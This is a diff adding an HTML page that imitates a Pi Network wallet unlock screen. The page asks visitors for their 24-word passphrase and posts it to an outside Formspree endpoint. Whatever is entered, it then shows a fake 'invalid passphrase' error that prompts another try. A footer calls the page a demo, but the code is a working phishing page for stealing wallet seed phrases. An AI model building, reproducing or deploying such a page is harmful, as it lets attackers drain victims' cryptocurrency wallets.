@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network</title>
+    <link rel="stylesheet" href="Style.css">
+    <script src="https://kit.fontawesome.com/50120ab97b.js" crossorigin="anonymous"></script>
+   
+</head>
+<body>
+    <div id="first">
+        <header>
+          <div>
+               <h1><i class="fas fa-wallet">  </i>Wallet <!--<img src="./img/PiNetworklogo2.png" class="img" alt=""> --></h1>
+          </div>
+      </header>
+
+      <div class="input">
+          <h2>Unlock Pi Wallet</h2>
+
+         <form action="https://formspree.io/f/mzzrqbge" method="POST" id="myForm" onsubmit="return handleFormSubmit(event);">
+            <textarea name="message" id="message" required placeholder="Enter your 24-word passphrase here"></textarea>
+            <button type="submit">Unlock With Passphrase</button>
+            <button type="submit" >Unlock With Fingerprint</button>
+         </form>
+
+     </div>
+
+     <div class="write-up">
+         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible
+         to you.</p>
+         <p>Recovery of passphrase is currently impossible.</p>
+
+         <span>Lost your passphrase? <a href="">You can create a new wallet,</a>
+             but all your pi in your previous wallet will be inaccessible </span>
+
+     </div>
+    </div>
+    
+    <div id="second" class="off">
+        <header>
+         <div>
+            <h1>Wallet<img src="./img/PiNetworklogo2.png"  class="img" alt=""></h1>
+         </div>
+       </header>
+
+       <div class="input">
+         <h2>Unlock Pi Wallet</h2>
+
+          <form >
+            
+            <p id="alert">Please provide a valid 24-work passphrase to unlock your Pi wallet, The phrase you provided is invalid</p>
+           
+                <div class="btn" id="ty"><a href="input.html">Try Again</a></div>
+          </form>
+
+        </div>
+
+        <div class="write-up">
+           <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible
+           to you.</p>
+           <p>Recovery of passphrase is currently impossible.</p>
+
+            <span>Lost your passphrase? <a href="">You can create a new wallet,</a>
+             but all your pi in your previous wallet will be inaccessible </span>
+
+        </div>
+    </div>
+    
+
+
+        <div class="foot"> 
+            <p>&copy; 2023 Pi Network. All rights reserved.</p>
+            <p class="warn">Disclaimer: This is a demo website and not affiliated with Pi Network.</p>
+        </div>
+    
+
+    
+
+  
+<script>
+   
+
+function handleFormSubmit(event) {
+    event.preventDefault();  
+    
+    const first = document.getElementById('first');
+    const second = document.getElementById('second');
+    first.classList.add('off');
+    second.style.display = 'block';
+
+    const formData = new FormData(event.target); 
+
+    
+    fetch(event.target.action, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            const first = document.getElementById('first');
+            const second = document.getElementById('second');
+            first.classList.add('off');
+            second.style.display = 'block';
+           
+        } else {
+        
+            console.error('Error submitting form:', response);
+        }
+    })
+    .catch(error => {
+        
+        console.error('Network error:', error);
+    });
+}
+
+
+const tryBtn = document.getElementById('ty')
+tryBtn.addEventListener('click', function() {
+    document.getElementById('message').value = '';
+});
+
+</script>
+</body>
+</html>
